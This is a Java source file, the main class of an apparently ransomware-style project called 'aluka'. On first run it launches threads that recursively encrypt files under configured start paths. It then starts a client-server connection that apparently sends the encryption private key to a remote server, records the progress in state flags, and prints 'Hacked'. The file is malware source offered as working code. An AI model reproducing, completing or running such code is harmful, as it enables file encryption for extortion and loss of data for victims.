package aluka;

import java.util.HashMap;

import aluka.configuration.Configuration;
import aluka.core.ClientServerManager;
import aluka.core.EncryptionManager;
import aluka.core.FileDeeperBrowser;
import aluka.core.StateManager;
import aluka.core.SystemManager;
import aluka.enums.State;

/**
 * Hello world!
 *
 */
public class App 
{
public static final String MODE = "POWERED";
	
	public static void main(String[] args) {
		
		if(MODE.equals("POWERED")) {
			
		}
		
		
		EncryptionManager encryption = new EncryptionManager();
		SystemManager system = new SystemManager();
		StateManager stateManager = new StateManager(system.getConfigPath());

		HashMap<String, Integer> params = new HashMap<String, Integer>();
	
		if (stateManager.getStates().get(State.ENCRYPTED.name()) == null || stateManager.getStates().get(State.ENCRYPTED.name()) == 0) {
			for (String path : system.getStartPath()) {
				System.out.println("Lauching Encryption for " + path);
				Thread thread = new Thread(new FileDeeperBrowser(encryption, path, system.getCallback()));
				thread.start();
			}
			params.clear();
			params.put(State.ENCRYPTED.name(), 1);
			stateManager.saveState(params);
			Thread thread1 = new Thread(new ClientServerManager(Configuration.getSimpleConnexion(), encryption));
			thread1.start();
			try {
				thread1.wait();
			} catch (InterruptedException e) {
				System.err.println("[ - ] - Interrupt key pressed");
				e.printStackTrace();
			}

			params.clear();
			params.put(State.PRIVATE_KEY_PUSHED.name(), 1);
		} else {
			if (stateManager.getStates().get(State.PRIVATE_KEY_PUSHED.name()) == null || stateManager.getStates().get(State.PRIVATE_KEY_PUSHED.name()) == 0) {
				Thread thread1 = new Thread(new ClientServerManager(Configuration.getSimpleConnexion(), encryption));
				thread1.start();
				try {
					thread1.wait();
				} catch (InterruptedException e) {
					System.err.println("[ - ] - Interrupt key pressed");
					e.printStackTrace();
				}

				params.clear();
				params.put(State.PRIVATE_KEY_PUSHED.name(), 1);
				System.out.println("Hacked");
			}else {
				System.out.println("Hacked");
			}
		}

	}
}
